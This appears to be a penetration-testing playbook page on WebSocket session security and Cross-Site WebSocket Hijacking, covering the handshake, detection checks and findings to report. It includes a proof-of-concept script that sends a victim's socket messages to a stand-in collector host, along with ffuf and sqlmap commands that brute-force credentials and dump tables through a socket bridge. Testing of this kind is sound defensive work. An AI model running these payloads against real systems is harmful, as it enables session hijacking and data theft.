# WebSocket session handling and Cross-Site WebSocket Hijacking — Open WHEN: recon shows a `ws://`/`wss://` endpoint, an `Upgrade: websocket` handshake, or a Socket.IO connection that carries authenticated, cookie-driven actions

A WebSocket starts as an HTTP/1.1 request that upgrades to a long-lived,
full-duplex channel. The session question is: how is that channel authenticated,
and can an off-origin page open it as the victim?

## The handshake
Client asks to upgrade:
```http
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```
Server accepts with `101 Switching Protocols` and a `Sec-WebSocket-Accept`.
Capture this handshake — its cookies and any `Sec-WebSocket-Protocol` header are
what authenticate the socket.

## Cross-Site WebSocket Hijacking (CSWSH) — the core session bug
If the handshake is authenticated **only** by the session cookie and carries no
unpredictable per-request token (CSRF token / nonce / `Origin` check), any
off-origin page can open an authenticated socket as the victim, because the
browser attaches the cookie automatically. This is the WebSocket analogue of
CSRF and is squarely a session-lifecycle defect.

Confirm it: from a different origin, open the socket and read/exfiltrate what
comes back. Page hosted off-origin:
```html
<script>
  ws = new WebSocket('wss://target.example/messages');
  ws.onopen   = () => ws.send("HELLO");
  ws.onmessage = (e) => fetch('https://collector.example/?'+encodeURIComponent(e.data), {mode:'no-cors'});
</script>
```
If the app uses a `Sec-WebSocket-Protocol` value in its handshake, pass it as
the second `WebSocket(...)` argument so the header is reproduced.

**Detection oracles**
- Handshake has a `Cookie` but no token/nonce that the server actually checks.
- Server does not validate the `Origin` header on the upgrade (replay the
  handshake with a foreign `Origin` and watch for `101`).
- Socket performs sensitive reads/writes (chat history, account actions) purely
  off the cookie.

## Session tokens carried in WebSocket messages
Some apps re-authenticate per message inside the channel (e.g. a `sessionId` in
a JSON frame). Capture those frames and test the token the same way as a cookie:
randomness, reuse, expiry, and whether one user's token is accepted on another's
socket.

## Fuzzing / driving the socket with installed tooling
The standard pen-test trick is to bridge a WebSocket to a normal HTTP endpoint
so HTTP tools can drive it. `ws-harness.py` listens on a local HTTP port,
forwards each request into the socket, and substitutes a `[FUZZ]` marker in a
message template:
```
python ws-harness.py -u "ws://target:8080/authenticate-user" -m ./message.txt
# message.txt: {"auth_user":"dGVzda==","auth_pass":"[FUZZ]"}
```
Then point `ffuf`/`sqlmap`/`curl` at the local proxy:
```
ffuf -u 'http://127.0.0.1:8000/?fuzz=FUZZ' -w creds.txt
sqlmap -u 'http://127.0.0.1:8000/?fuzz=test' --tables --tamper=base64encode --dump
```
This lets you test message-level auth, injection, and access-control over a
channel `curl` alone cannot speak.

## What to assert (the findings)
- The upgrade requires an unpredictable token bound to the session, not just the
  cookie (no CSWSH).
- The server validates `Origin` on the handshake.
- Closing/logging out tears the socket down server-side; a captured handshake
  cannot be replayed after logout.
- Per-message tokens, if any, are random, single-context, and expire.
